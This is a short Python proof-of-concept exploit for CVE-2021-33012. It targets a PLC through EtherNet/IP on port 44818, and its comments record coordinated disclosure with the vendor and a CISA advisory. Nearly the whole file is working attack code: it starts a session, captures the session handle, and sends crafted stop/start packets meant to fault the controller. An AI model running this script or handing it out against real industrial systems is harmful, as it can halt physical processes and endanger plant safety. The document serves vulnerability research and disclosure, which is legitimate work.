
#! /usr/bin/python3

'''

 Note 2020707:

 The vendor was notified of this problem back on 20200127. Even so,
 I'm not releasing the name or model of PLC that this affects yet.
 The vendor has confirmed the bug, but has been unable to release a fix due 
 to considerable resource constraint from the Covid pandemic. Once
 they release a fix I'll coordinate disclosure with them.
 
 
 Note 20220427:
 
 CVE-2021-33012
 https://www.cisa.gov/uscert/ics/advisories/icsa-21-189-01
 
'''

import struct
import socket
import binascii
import sys
import time

def usage():
    print("\nUsage: %s %s\n") %(sys.argv[0],"<ip addr>")

try:
   HOST=sys.argv[1]
except IndexError as e:
   usage()
   sys.exit(1)

PORT=44818
startSession='65000400000000000000000000000000000000000000000001000000'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.settimeout(5)

#print("Sendng startSession...")
s.send(binascii.a2b_hex(startSession))
resp = s.recv(1024)

respHexlified = binascii.hexlify(resp)

respJoined = ''.join(respHexlified)
sess = respJoined[8:16]

print("Faulting PLC...")

stop1  = "6f001700" + sess + "000000001ab9d157c70058ad00000000000000000a0002008100010000910006000f0001088001"
start1 = "6f001f00" + sess + "000000001ab9d157c70058ad00000000000000000a000200810001000091000e000f000108ab0200e0000260006000"
stop2  = "6f001700" + sess + "000000001ab9d157c70058ad00000000000000000a0002008100010000910006000f0001088006"
start2 = "6f001f00" + sess + "000000001ab9d157c70058ad00000000000000000a000200810001000091000e000f000108ab0200e0000220000000"
start3 = "6f001f00" + sess + "000000001ab9d157c70058ad00000000000000000a000200810001000091000e000f000108ab0200e0000240000000"

s.send(binascii.a2b_hex(stop1))
s.send(binascii.a2b_hex(start1))
time.sleep(.3)
s.send(binascii.a2b_hex(stop2))
s.send(binascii.a2b_hex(start2))
s.send(binascii.a2b_hex(start3))
